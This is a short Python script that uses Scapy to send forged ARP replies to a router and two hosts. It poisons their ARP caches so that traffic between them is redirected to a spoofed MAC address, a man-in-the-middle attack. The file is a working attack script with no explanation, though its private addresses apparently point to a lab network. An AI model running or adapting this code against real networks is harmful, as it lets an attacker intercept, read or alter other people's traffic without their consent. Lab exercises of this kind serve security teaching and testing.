from scapy.all import ARP, Ether, Raw, send


ROUTER_IP = "10.9.0.1"
ROUTER_MAC = "02:42:0c:27:f4:f7"

SPOOF_MAC = "02:42:0c:27:f4:f8"

def confuse_device(ip, hwaddr):
    arp_dev = ARP(op=2, psrc=ip, hwsrc=SPOOF_MAC, pdst=ROUTER_IP, hwdst=ROUTER_MAC)
    ether_dev = Ether(dst=ROUTER_MAC, src=SPOOF_MAC)
    arp_router = ARP(op=2, psrc=ROUTER_IP, hwsrc=SPOOF_MAC, pdst=ip, hwdst=hwaddr)
    ether_router = Ether(dst=hwaddr, src=SPOOF_MAC)

    send(ether_dev / arp_dev)
    send(ether_router / arp_router)

    print("Sent?")


def main():
    confuse_device("10.9.0.5", "aa:bb:cc:dd:ee:05")
    confuse_device("10.9.0.6", "aa:bb:cc:dd:ee:06")

if __name__ == "__main__":
    main()